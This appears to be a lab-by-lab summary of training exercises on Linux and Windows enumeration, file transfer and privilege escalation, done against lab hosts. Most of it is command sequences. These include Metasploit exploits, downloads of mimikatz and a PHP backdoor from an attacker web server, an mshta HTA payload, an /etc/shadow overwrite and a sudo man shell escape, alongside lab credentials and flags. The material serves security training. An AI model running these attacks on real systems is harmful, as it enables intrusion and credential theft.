# Linux Enumeration, File Transfer & Privilege Escalation Labs — Summary

Targets: **demo.ine.local** (most labs) and **target.ine.local** (last two).
Attacker: Kali Linux.

> Flags/credentials below are copied verbatim from the source PDF.

---

## Lab 1 — Automating Linux Local Enumeration
- **Target / OS:** Ubuntu 14.04.6 LTS — Apache httpd 2.4.6 on port 80
- **Foothold:** ShellShock (`apache_mod_cgi_bash_env_exec`)
- **Tools:** Nmap, Metasploit (post modules: `enum_configs`, `enum_network`, `enum_system`), LinEnum.sh

**Commands**
```
ping -c4 demo.ine.local
nmap -sV demo.ine.local
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS demo.ine.local
set TARGETURI /gettime.cgi
set LHOST 192.58.2.2
exploit

# automate enumeration with post modules
background
use post/linux/gather/enum_configs
set SESSION 1
run

use post/linux/gather/enum_network
set SESSION 1
run
cat /root/.msf4/loot/<file>.txt    # view collected data

use post/linux/gather/enum_system
set SESSION 1
run

# automate enumeration with LinEnum (script from github.com/rebootuser/LinEnum)
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i
chmod +x LinEnum.sh
./LinEnum.sh
```
**Flag:** (none — enumeration lab)

---

## Lab 2 — Setting Up A Web Server With Python
- **Purpose:** Host files for transfer from Kali
- **Tools:** Python SimpleHTTPServer

**Commands**
```
python -m SimpleHTTPServer 80
# verify by browsing to Kali's IP in a browser
```
**Flag:** (none — utility lab)

---

## Lab 3 — Transferring Files To Windows Targets
- **Target / OS:** Windows Server 2008 R2 – 2012 (6.3.9600) — Rejetto HTTP File Server (HFS) 2.3 on port 80
- **Tools:** Nmap, searchsploit, Metasploit (`rejetto_hfs_exec`), Python3 `http.server`, certutil

**Commands**
```
ping -c 4 demo.ine.local
nmap -sV demo.ine.local
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

# host file on Kali
cd /usr/share/windows-resources/mimikatz/x64
python3 -m http.server 80

# on target (meterpreter)
cd C:\\
mkdir Temp
cd Temp
shell
certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
```
**Flag:** (none — file-transfer demo)

---

## Lab 4 — Transferring Files To Linux Targets
- **Target / OS:** Linux — Samba smbd 3.X–4.X on ports 139/445
- **Foothold:** `is_known_pipename` (SambaCry)
- **Tools:** Nmap, Metasploit (`is_known_pipename`), Python3 `http.server`, wget

**Commands**
```
ping -c 4 demo.ine.local
nmap -sV demo.ine.local
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS demo.ine.local
exploit

# host file on Kali
cd /usr/share/webshells/php/
python3 -m http.server 80

# on target (command shell) — use your Kali IP
wget http://192.217.117.2/php-backdoor.php
```
**Flag:** (none — file-transfer demo)

---

## Lab 5 — Upgrading Non-Interactive Shells
- **Target / OS:** Linux — Samba on 445
- **Foothold:** `is_known_pipename`
- **Tools:** Nmap, Metasploit (`is_known_pipename`), bash, Python pty

**Commands**
```
ping -c 4 demo.ine.local
nmap -sV demo.ine.local
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS demo.ine.local
exploit

# upgrade the shell
/bin/bash -i
python -c 'import pty; pty.spawn("/bin/bash")'
```
**Flag:** (none — technique demo)

---

## Lab 6 — Windows: PrivescCheck
- **Target / OS:** Windows (Victim, 10.0.17763.1457) — running as `student`
- **Technique:** WinLogon stored credentials found by PrivescCheck.ps1
- **Tools:** PowerShell, PrivescCheck.ps1, runas, Metasploit (`hta_server`), mshta

**Commands**
```
# on Victim (PowerShell)
whoami
cd C:\Users\student\Desktop\PrivescCheck
ls
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# found creds administrator:hello_123321
runas.exe /user:administrator cmd
# (enter password: hello_123321)
whoami

# on Kali
msfconsole -q
use exploit/windows/misc/hta_server
exploit

# on Victim (admin cmd) — use your own HTA link
mshta.exe http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta

# back on Kali
sessions -i 1
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```
**Credentials:** `administrator:hello_123321`
**Flag:** `2b070a650a92129c2462deae7707b0c5`

---

## Lab 7 — Linux Privilege Escalation: Permissions Matter!
- **Target / OS:** Linux (target.ine.local) — web terminal on port 8000
- **Technique:** World-writable `/etc/shadow` + empty root password
- **Tools:** find, ls, cat, openssl, vim, su

**Commands**
```
ping -c4 target.ine.local
# browse to http://target.ine.local:8000 for the web terminal

find / -not -type l -perm -o+w        # find world-writable files
ls -l /etc/shadow
cat /etc/shadow

openssl passwd -1 -salt abc password  # generate a hash entry
vim /etc/shadow                       # paste hash into root's record

su                                    # password: password
cd /root
ls -l
cat flag
```
**Set root password:** `password`
**Flag:** `e62ab67ddff744d60cbb6232feaefc4d`

---

## Lab 8 — Editing Gone Wrong
- **Target / OS:** Linux (target.ine.local) — web terminal on port 8000
- **Technique:** `sudo man` misconfiguration (NOPASSWD) → shell escape (GTFOBins)
- **Tools:** find, sudo, man, bash

**Commands**
```
ping -c 4 target.ine.local
# browse to http://target.ine.local:8000

find / -user root -perm -4000 -exec ls -ldb {} \;   # SUID hunt (nothing useful)
sudo -l                                             # (root) NOPASSWD: /usr/bin/man

sudo man ls
!/bin/bash                                          # shell escape from the pager -> root

cd /root
ls -l
cat flag
```
**Flag:** `74f5cc752947ec8a522f9c49453b8e9a`

---

## Quick Index
| # | Lab | Target / Foothold | Key technique |
|---|-----|-------------------|---------------|
| 1 | Automating Linux Local Enum | Ubuntu 14.04 / ShellShock | enum_* post modules + LinEnum.sh |
| 2 | Web Server With Python | Kali | SimpleHTTPServer file hosting |
| 3 | Transfer to Windows | HFS 2.3 | certutil download |
| 4 | Transfer to Linux | Samba (is_known_pipename) | wget download |
| 5 | Upgrade Non-Interactive Shells | Samba | bash -i / python pty |
| 6 | PrivescCheck | Windows student user | WinLogon creds + runas + HTA |
| 7 | Permissions Matter! | Linux web terminal | world-writable /etc/shadow |
| 8 | Editing Gone Wrong | Linux web terminal | sudo man shell escape |
